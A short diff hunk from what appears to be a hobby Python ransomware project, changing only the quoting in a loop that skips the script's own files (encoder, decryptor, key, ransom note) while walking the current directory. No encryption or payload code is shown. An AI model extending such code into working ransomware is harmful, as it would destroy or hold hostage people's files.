@@ -20,7 +20,7 @@ for file in os.listdir():
 print(files)'''
 
 for file in os.listdir():
-    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key" or file=="READ_THIS.txt" or file==".git":
+    if file== "ransomewareEncoding.py"  or file=="ransomewareDecrypting.py" or file=="encryption.key" or file=="READ_THIS.txt" or file=='.git':
         continue
     if os.path.isdir(file):
         continue
